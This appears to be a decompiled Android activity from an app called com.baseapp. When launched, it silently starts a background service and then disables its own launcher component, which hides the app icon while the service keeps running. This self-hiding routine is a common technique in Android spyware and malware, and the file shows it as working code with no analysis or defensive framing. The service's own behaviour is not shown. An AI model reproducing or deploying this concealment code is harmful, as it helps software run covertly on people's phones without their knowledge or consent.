package com.baseapp;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

/* loaded from: classes.dex */
public class Main extends Activity {
    @Override // android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (!MainService.isRunning) {
            Intent i = new Intent("com.baseapp.MainServiceStart");
            i.setClass(this, MainService.class);
            startService(i);
        }
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, Main.class);
        packageManager.setComponentEnabledSetting(componentName, 2, 1);
        finish();
    }
}